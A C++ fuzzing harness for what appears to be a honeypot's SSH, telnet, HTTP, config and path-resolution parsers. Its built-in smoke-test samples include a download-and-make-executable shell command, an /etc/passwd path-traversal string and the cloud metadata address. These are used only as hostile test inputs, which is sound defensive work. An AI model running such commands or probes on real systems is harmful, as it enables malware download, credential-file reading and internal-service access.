// libFuzzer targets for every parser that touches attacker bytes.
//
// One file, one target per translation unit, selected at compile time by
// ARAPUCA_FUZZ_TARGET. Keeping them together makes it obvious that each one
// is the same shape: take bytes, feed the parser, assert nothing. A fuzz
// target does not check behaviour, it checks that hostile input cannot crash,
// hang, or read out of bounds.
//
// Two build modes:
//
//   With libFuzzer (clang plus the compiler runtime), this exposes
//   LLVMFuzzerTestOneInput and fuzzes.
//
//   Without it, a plain main() replays every file given on the command line.
//   That is what runs in CI on the committed corpus and on the crashes
//   directory, so a regression is caught by an ordinary build even where
//   libFuzzer is not available.

#include <arapuca/capture/address_policy.hpp>
#include <arapuca/core/config.hpp>
#include <arapuca/core/limits.hpp>
#include <arapuca/http/request_record.hpp>
#include <arapuca/ssh/command_line.hpp>
#include <arapuca/ssh/line_editor.hpp>
#include <arapuca/ssh/shell.hpp>
#include <arapuca/ssh/vfs.hpp>
#include <arapuca/telnet/protocol.hpp>
#include <arapuca/util/redaction.hpp>

#include <cstddef>
#include <cstdint>
#include <string>
#include <string_view>

namespace {

[[maybe_unused]] void fuzz_redaction(std::string_view input) {
    // The invariant that matters: whatever comes out must be serializable.
    // A throw here would be a remote denial of service, which is exactly what
    // this function exists to prevent.
    const auto result = arapuca::util::sanitize(input, 4096);
    const nlohmann::json value = result.text;
    (void)value.dump();
}

[[maybe_unused]] void fuzz_command_line(std::string_view input) {
    const auto parsed = arapuca::ssh::parse_command_line(input);
    for (const auto& segment : parsed.segments) {
        (void)segment.argv.size();
    }
    (void)arapuca::ssh::tokenize(input);
}

[[maybe_unused]] void fuzz_terminal_input(std::string_view input) {
    arapuca::ssh::LineEditor editor;
    for (const auto& step : editor.feed(input)) {
        (void)step.echo.size();
    }
}

[[maybe_unused]] void fuzz_vfs_path(std::string_view input) {
    // Split the input so both the working directory and the path argument are
    // attacker controlled, which is the real situation inside a session.
    const auto middle = input.size() / 2;
    const auto cwd = input.substr(0, middle);
    const auto path = input.substr(middle);

    const auto resolved = arapuca::ssh::Vfs::resolve(cwd, path);
    if (resolved.has_value()) {
        // No resolution may ever escape the virtual root or keep a dot dot.
        const std::string& value = *resolved;
        if (value.empty() || value.front() != '/' || value.find("/../") != std::string::npos) {
            __builtin_trap();
        }
    }
}

[[maybe_unused]] void fuzz_http_request(std::string_view input) {
    arapuca::http::RawRequest request;
    const auto third = input.size() / 3;
    request.method = std::string(input.substr(0, third));
    request.path = std::string(input.substr(third, third));
    request.body = std::string(input.substr(2 * third));
    request.headers = {{"User-Agent", request.method}, {"X-Test", request.path}};

    const auto summary = arapuca::http::summarize(request, 2048);
    (void)summary.detail.dump();
}

[[maybe_unused]] void fuzz_config(std::string_view input) {
    try {
        auto config = arapuca::core::Config::parse(std::string(input));
        (void)config.validate_and_clamp();
    } catch (const std::exception&) {
        // A clean failure is the contract for malformed configuration, so an
        // exception is a pass. What this target hunts for is the other
        // outcome: a crash, a hang, or a read out of bounds.
    }
}

[[maybe_unused]] void fuzz_address_policy(std::string_view input) {
    const auto verdict = arapuca::capture::classify_text(input);
    // Anything that is not a well formed global unicast address must be
    // refused. A parser that accepted garbage would be an SSRF bypass.
    (void)arapuca::capture::is_allowed(verdict);
}

[[maybe_unused]] void fuzz_shell(std::string_view input) {
    static const auto kRegistry = arapuca::ssh::CommandRegistry::standard();
    static const auto kFilesystem = arapuca::ssh::Vfs::from_yaml(
        "etc:\n  type: dir\n  children:\n"
        "    passwd:\n      type: file\n      content: \"x\"\n"
        "tmp:\n  type: dir\n");

    arapuca::ssh::ShellContext context;
    context.vfs = kFilesystem;
    arapuca::ssh::Shell shell(kRegistry, context);
    (void)shell.execute(input).output.size();
}

[[maybe_unused]] void fuzz_telnet_protocol(std::string_view input) {
    // Split the input into chunks, so a sequence straddling a recv boundary
    // is exercised the way it actually arrives off a socket. The invariant:
    // the decoder never crashes and never emits more response than the
    // negotiation cap allows.
    arapuca::telnet::Decoder decoder;
    std::size_t offset = 0;
    while (offset < input.size()) {
        const std::size_t step = (static_cast<unsigned char>(input[offset]) % 7) + 1;
        const auto chunk = input.substr(offset, step);
        const auto out = decoder.feed(chunk);
        (void)out.clean.size();
        (void)out.response.size();
        offset += chunk.size();
    }
    if (decoder.negotiations() > arapuca::limits::kMaxTelnetNegotiations) {
        __builtin_trap();
    }
}

void dispatch(const std::uint8_t* data, std::size_t size) {
    const std::string_view input(reinterpret_cast<const char*>(data), size);  // NOLINT
#if ARAPUCA_FUZZ_TARGET == 1
    fuzz_redaction(input);
#elif ARAPUCA_FUZZ_TARGET == 2
    fuzz_command_line(input);
#elif ARAPUCA_FUZZ_TARGET == 3
    fuzz_terminal_input(input);
#elif ARAPUCA_FUZZ_TARGET == 4
    fuzz_vfs_path(input);
#elif ARAPUCA_FUZZ_TARGET == 5
    fuzz_http_request(input);
#elif ARAPUCA_FUZZ_TARGET == 6
    fuzz_config(input);
#elif ARAPUCA_FUZZ_TARGET == 7
    fuzz_address_policy(input);
#elif ARAPUCA_FUZZ_TARGET == 8
    fuzz_shell(input);
#elif ARAPUCA_FUZZ_TARGET == 9
    fuzz_telnet_protocol(input);
#else
#error "ARAPUCA_FUZZ_TARGET must be set to a target number"
#endif
}

}  // namespace

#ifdef ARAPUCA_WITH_LIBFUZZER

extern "C" int LLVMFuzzerTestOneInput(const std::uint8_t* data, std::size_t size) {
    dispatch(data, size);
    return 0;
}

#else

#include "../support/read_file.hpp"

#include <iostream>
#include <vector>

/// Corpus replay. Every file named on the command line is fed to the target
/// once. This is what keeps the committed corpus and the crash regressions
/// exercised on builds without libFuzzer.
int main(int argc, char** argv) {
    int replayed = 0;
    for (int i = 1; i < argc; ++i) {
        const std::string bytes = arapuca::testing::read_whole_file(argv[i]);
        dispatch(reinterpret_cast<const std::uint8_t*>(bytes.data()), bytes.size());  // NOLINT
        ++replayed;
    }

    if (replayed == 0) {
        // No corpus given: run a small built in set so the binary is still a
        // meaningful smoke test on its own.
        for (const auto* sample : {"",
                                   "a",
                                   "cd /tmp; wget http://x/y && chmod +x y",
                                   "\x1b[A\x7f\x03",
                                   "../../../../etc/passwd",
                                   "169.254.169.254",
                                   "ssh:\n  port: 70000\n"}) {
            const std::string_view view(sample);
            dispatch(reinterpret_cast<const std::uint8_t*>(view.data()), view.size());  // NOLINT
        }
        replayed = 7;
    }

    std::cout << "replayed " << replayed << " input(s) without a crash\n";
    return 0;
}

#endif
